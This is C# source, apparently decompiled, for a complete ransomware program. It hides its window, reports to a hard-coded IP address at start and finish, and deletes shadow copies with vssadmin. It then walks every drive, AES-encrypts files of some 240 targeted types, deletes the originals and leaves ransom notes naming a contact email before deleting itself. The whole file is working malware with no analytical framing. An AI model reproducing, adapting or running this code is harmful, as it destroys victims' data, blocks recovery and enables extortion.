using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace Death;

public class Form1 : Form
{
	public static string computerInfo = Environment.MachineName.ToString() + " Decryption Key: ";

	public static string _publicKey = "<RSAKeyValue><Modulus>6/AspPehzTvemy+uPbdKZQNCjfMXRKL3RY6YudW/9uJ+npu0Qa+SaeSOl2xZfoI6h/V1T1mjY9RliaqOyc+CTas5BpeqdJCzZjasKfObmmE4sitSszv6agePAD1tZRZvpZD/hAK+adIJikUzMc90KWPcBE8FCeqj7PmM/THF5YkYMT/YYkEXyfeq+Ob88FVdU4HvT6AlpGRrIeGWcdGMGMEMV4lTOCNSW9hnOTKgWC8Hp3hWcR7kzcNKO/opSTztpHQlAnvrhELvvsA8T1p2cM/T5xHHGTt5gL+IDRV0IFJAujfbVdy1I2oaUD8jScST04CcnB6P03EDqGQ25Klbq4+YkHp4YlXIox5aMyaNlU/HXWo7x9JiVGvukPWChY8CQR0NeNRDdhUSdznFIpOB2VE+IuIwPUeFv9J+VpmG6xPzBirXgVKizhKYuh9n+wDKacIHmoQEXKOyj0l0xcpWiLPVzjHmMuy21UuxuGmhuNSo2o3BAxBT0qHfbpCyouHbaw4X05vbqI9tH/XzMurxpgsV8dU1k5Z6goRxIhppaaI3L7mw19u/wbgzUk23bUTnGKlufzJ09hPk5JxhnuIZZw1M5WLm6Am3M/qFIGXOZ5NnZeiLpzqu6qerV2XZnZiAjIQs0XoT1KmQaC/H+KnG6IF70H8py3Ay1ZEdRNtsAe0=</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>";

	public static string _encrptedComputerInfo;

	private static UnicodeEncoding _encoder = new UnicodeEncoding();

	private IContainer components;

	public Form1()
	{
		InitializeComponent();
	}

	private void Form1_Load_1(object sender, EventArgs e)
	{
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowInTaskbar(false);
		startAction();
	}

	public static string EncryptRSA(string data)
	{
		RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider();
		rSACryptoServiceProvider.FromXmlString(_publicKey);
		byte[] bytes = _encoder.GetBytes(data);
		byte[] array = rSACryptoServiceProvider.Encrypt(bytes, fOAEP: false).ToArray();
		int num = array.Count();
		int num2 = 0;
		StringBuilder stringBuilder = new StringBuilder();
		byte[] array2 = array;
		foreach (byte value in array2)
		{
			num2++;
			stringBuilder.Append(value);
			if (num2 < num)
			{
				stringBuilder.Append(",");
			}
		}
		return stringBuilder.ToString();
	}

	public string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return stringBuilder.ToString();
	}

	public static void FileEncryptL(string inputFile, string password)
	{
		byte[] salt = new byte[8] { 8, 4, 3, 4, 5, 6, 7, 9 };
		FileStream fileStream = new FileStream(inputFile + ".encryptedL", FileMode.Create);
		byte[] bytes = Encoding.UTF8.GetBytes(password);
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		rijndaelManaged.Padding = PaddingMode.PKCS7;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, salt, 50000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CFB;
		CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
		FileStream fileStream2 = new FileStream(inputFile, FileMode.Open);
		byte[] array = new byte[1048576];
		try
		{
			int count;
			while ((count = fileStream2.Read(array, 0, array.Length)) > 0)
			{
				Application.DoEvents();
				cryptoStream.Write(array, 0, count);
			}
			fileStream2.Close();
		}
		catch (Exception)
		{
		}
		finally
		{
			cryptoStream.Close();
			fileStream.Close();
			File.Delete(inputFile);
		}
	}

	public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] array = null;
		byte[] salt = new byte[8] { 8, 4, 3, 4, 5, 6, 7, 9 };
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}

	public static void EncryptFileS(string file, string password)
	{
		byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
		byte[] bytes = Encoding.UTF8.GetBytes(password);
		bytes = SHA256.Create().ComputeHash(bytes);
		byte[] bytes2 = AES_Encrypt(bytesToBeEncrypted, bytes);
		File.WriteAllBytes(file, bytes2);
		File.Move(file, file + ".encryptedS");
	}

	public static void encryptDirectory(string location, string password)
	{
		string[] source = new string[243]
		{
			".txt", ".mbz5g2", ".qrp", ".edb", ".accdb", ".trn", ".frm", ".idb", ".mdb", ".mdw",
			".trg", ".trn", ".qbb", ".html", ".pst", "thm", "hda", "ver", ".pay", "gsb",
			".wfm", ".bcb", ".del", ".bk1", ".bk2", ".bk3", ".bk4", ".qbw", ".nd", ".qbb",
			".qbm", ".qbx", ".qba", ".tlg", ".7z", ".rar", ".m4a", ".wma", ".avi", ".wmv",
			".csv", ".d3dbsp", ".sc2save", ".sie", ".sum", ".ibank", ".t13", ".t12", ".qdf", ".gdb",
			".tax", ".pkpass", ".bc6", ".bc7", ".bkp", ".qic", ".bkf", ".sidn", ".sidd", ".mddata",
			".itl", ".itdb", ".icxs", ".hvpl", ".hplg", ".hkdb", ".mdbackup", ".syncdb", ".gho", ".cas",
			".svg", ".map", ".wmo", ".itm", ".sb", ".fos", ".mcgame", ".vdf", ".vbm", ".ztmp",
			".sis", ".sid", ".ncf", " .menu", ".layout", ".dmp", ".blob", ".vib", ".vom", ".vlb",
			".vbk", ".vsm", ".esm", ".001", ".vtf", ".dazip", ".fpk", ".mlx", ".kf", ".iwd",
			".vpk", ".tor", ".psk", ".rim", ".w3x", ".fsh", ".ntl", ".arch00", ".lvl", ".snx",
			".cfr", ".ff", ".vpp_pc", ".lrf", ".m2", ".mcmeta", ".vfs0", ".mpqge", ".kdb", ".db0",
			".DayZProfile", ".rofl", ".hkx", ".bar", ".upk", ".das", ".iwi", ".litemod", ".asset", ".forge",
			".ltx", ".bsa", ".apk", ".re4", ".sav", ".lbf", ".slm", ".bik", ".epk", ".rgss3a",
			".pak", ".big", ".unity3d", ".wotreplay", ".xxx", ".desc", ".py", ".m3u", ".flv", ".js",
			".css", ".rb", ".png", ".jpeg", ".txt", ".p7c", ".p7b", ".p12", ".pfx", ".pem",
			".crt", ".cer", ".der", ".x3f", ".srw", ".pef", ".ptx", ".r3d", ".rw2", ".rwl",
			".raw", ".raf", ".orf", ".nrw", ".mrwref", ".mef", ".erf", ".kdc", ".dcr", ".cr2",
			".crw", ".bay", ".sr2", ".srf", ".arw", ".3fr", ".dng", ".jpe", ".jpg", ".cdr",
			".indd", ".ai", ".eps", ".pdf", ".pdd", ".psd", ".dbf", ".dbfv", ".mdf", ".wb2",
			".rtf", ".wpd", ".dxg", ".xf", ".dwg", ".pst", ".accdb", ".mdb", ".pptm", ".pptx",
			".ppt", ".xlk", ".xlsb", ".xlsm", ".xlsx", ".xls", ".wps", ".docm", ".docx", ".doc",
			".odb", ".odc", ".odm", ".odp", ".ods", ".odt", ".zip", ".rpt", ".bkf", ".ldf",
			".mdf", ".sql", ".bak", ".clx", ".tlx", ".pla", ".ldx", ".cfg", ".msg", "bat",
			".idx", ".qdb", ".tps"
		};
		string[] files = Directory.GetFiles(location);
		for (int i = 0; i < files.Length; i++)
		{
			string extension = Path.GetExtension(files[i]);
			if (!source.Contains(extension.ToLower()))
			{
				continue;
			}
			try
			{
				if (new FileInfo(Path.GetFullPath(files[i])).Length > 50000000L)
				{
					FileEncryptL(files[i], password);
				}
				else
				{
					EncryptFileS(files[i], password);
				}
			}
			catch
			{
			}
		}
	}

	public static void messageCreator(string fullpath)
	{
		fullpath += "\\Decrypt Instructions.txt";
		string[] contents = new string[1] { "All of your files are encrypted, to decrypt them write us to email: AllZData@cock.li \r\n\r\n\r\n" + _encrptedComputerInfo };
		try
		{
			File.WriteAllLines(fullpath, contents);
		}
		catch
		{
		}
	}

	public static void ProcessDirectory(string targetDirectory, string password)
	{
		try
		{
			encryptDirectory(targetDirectory, password);
			messageCreator(targetDirectory);
		}
		catch
		{
		}
		try
		{
			string[] directories = Directory.GetDirectories(targetDirectory);
			for (int i = 0; i < directories.Length; i++)
			{
				ProcessDirectory(directories[i], password);
			}
		}
		catch
		{
		}
	}

	public void shadows()
	{
		Process.Start(new ProcessStartInfo
		{
			Arguments = "delete shadows /all /quiet",
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true,
			FileName = "vssadmin.exe"
		});
	}

	public void startAction()
	{
		try
		{
			WebRequest.Create("http://176.119.28.97/" + Environment.MachineName.ToString() + "_start").GetResponse();
		}
		catch
		{
		}
		string text = CreatePassword(12);
		_encrptedComputerInfo = EncryptRSA(computerInfo + text);
		shadows();
		string[] logicalDrives = Directory.GetLogicalDrives();
		foreach (string targetDirectory in logicalDrives)
		{
			try
			{
				ProcessDirectory(targetDirectory, text);
			}
			catch
			{
			}
		}
		try
		{
			WebRequest.Create("http://176.119.28.97/" + Environment.MachineName.ToString() + "_finish").GetResponse();
		}
		catch
		{
		}
		Process.Start(new ProcessStartInfo
		{
			Arguments = "/C choice /C Y /N /D Y /T 5 & DEL " + Application.get_ExecutablePath(),
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true,
			FileName = "cmd.exe"
		});
		Application.Exit();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(116, 20));
		((Control)this).set_Name("Form1");
		((Control)this).set_Text("Form1");
		((Form)this).add_Load((EventHandler)Form1_Load_1);
		((Control)this).ResumeLayout(false);
	}
}
